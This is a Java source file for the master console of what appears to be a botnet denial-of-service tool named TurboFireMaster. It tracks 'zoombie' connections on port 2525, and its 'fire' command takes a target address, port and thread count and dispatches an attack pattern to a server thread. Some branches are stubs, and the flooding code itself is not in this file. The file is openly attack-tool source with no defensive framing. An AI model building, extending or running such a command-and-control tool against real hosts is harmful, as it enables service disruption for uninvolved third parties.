package app;

import java.net.ServerSocket;
import java.net.Socket;
import java.net.InetAddress;
import view.GUI;
import utilies.AttackPattern;
import tasks.ServerThread;
import tasks.ClientThread;
import java.util.List;
import java.util.ArrayList;

public class TurboFireMaster {
    
    private GUI gui;
    private int serverPort;
    private ServerSocket server;
    private Runnable serverThread;
    private ArrayList zoombieList;
    private AttackPattern attackPattern;


    public TurboFireMaster() {
        this.gui = new GUI();
        this.serverPort = 2525;
        this.zoombieList = new ArrayList<Socket>();
        startMaster();
    }

    public void startMaster() {
        while(true) {
            this.gui.welcome("master", this.serverPort);
            String[] command = this.gui.getCommand();
            this.gui.clean();
            
            if(command[0].equals("listen")) {
                // Thread t = new Thread(new ServerThread());
                // t.start();
                // this.gui.pressEnterToContinue();
            }else if(command[0].equals("list")) {
            
            }else if(command[0].equalsIgnoreCase("fire")) {
                int port = 80;
                String ipAddress = null;
                int threadAmount = 1;
                for(int i=1 ; i < command.length ; i++) {
                    if(command[i].equals("--address") || command[i].equals("-ip")) {
                        if(command[i+1] != null && command[i+1].getClass().getName().toString().equals("java.lang.String")) {
                            ipAddress = command[i+1];
                            i++;
                        }
                    }else if(command[i].equals("--port") || command[i].equals("-p")) {
                        if(command[i+1] != null) {
                            port = Integer.parseInt(command[i+1]);
                            if(port < 1024 || port > 65535) {
                                port = 80;
                            }
                            i++;
                        }
                    }else if(command[i].equals("--threads") || command[i].equals("-t")) {
                        if(command[i+1] != null) {
                            threadAmount = Integer.parseInt(command[i+1]);
                            i++;
                        }
                    }
                }
                if(ipAddress == null) {
                    ipAddress = "127.0.0.1";
                }
                if(command.length == 1) {
                    this.gui.showMessage("You didnt enter any arguments. Then, this parameters will be set for attack operation: ");
                }else {
                    this.gui.showMessage("Finished! Your attack operation was been configured!");        
                }
                this.gui.showMessage("Address: " + ipAddress);
                this.gui.showMessage("Port: " + port);
                this.gui.showMessage("Operation Thread Amount: " + threadAmount);
                this.gui.pressEnterToContinue();
                this.attackPattern = new AttackPattern(ipAddress, port, threadAmount);
                Thread t = new Thread(new ServerThread(this.attackPattern));
                t.start();
            }
        }
    }

    public int getServerPort() {
        return this.serverPort;
    }

    public InetAddress getServerAddress() {
        return this.server.getInetAddress();
    }
}